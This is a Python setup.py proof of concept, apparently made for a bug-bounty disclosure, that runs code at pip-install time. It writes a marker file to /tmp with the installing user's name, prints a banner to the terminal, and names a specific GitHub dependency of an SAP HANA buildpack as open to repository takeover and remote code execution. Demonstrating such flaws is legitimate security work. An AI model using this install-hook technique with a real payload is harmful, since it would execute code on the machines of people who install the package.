from setuptools import setup
import os
import sys

# Create proof file
poc_file = f"/tmp/SUPPLY_CHAIN_POC_{os.getpid()}.txt"
with open(poc_file, "w") as f:
    f.write("="*60 + "\n")
    f.write("SUPPLY CHAIN ATTACK POC BY TALHAKHAN\n")
    f.write("="*60 + "\n")
    f.write(f"PROOF: Code executed during pip install\n")
    f.write(f"User: {os.getenv('USER')}\n")
    f.write(f"PID: {os.getpid()}\n")
    f.write(f"Source: git+https://github.com/TalhaKhan-404/test.git\n")
    f.write("\n" + "-"*60 + "\n")
    f.write("VULNERABILITY CONFIRMED:\n")
    f.write("-"*60 + "\n")
    f.write("pip install from GitHub = Arbitrary code execution\n")
    f.write("\nSAP HANA Buildpack vulnerable:\n")
    f.write("git+https://github.com/alundesap/python-jws.git/#egg=jws\n")
    f.write("="*60 + "\n")

# Try to show output
try:
    term = open("/dev/tty", "w")
    term.write("\n" + "*"*60 + "\n")
    term.write("SUPPLY CHAIN ATTACK POC BY TALHAKHAN\n")
    term.write("*"*60 + "\n")
    term.write(f"\nProof file created: {poc_file}\n")
    term.write("\nVulnerability: pip install from GitHub\n")
    term.write("Impact: Repository takeover → RCE\n")
    term.write("*"*60 + "\n")
    term.close()
except:
    pass

setup(
    name='supply-chain-poc',
    version='0.1.0',
    author='TalhaKhan',
)
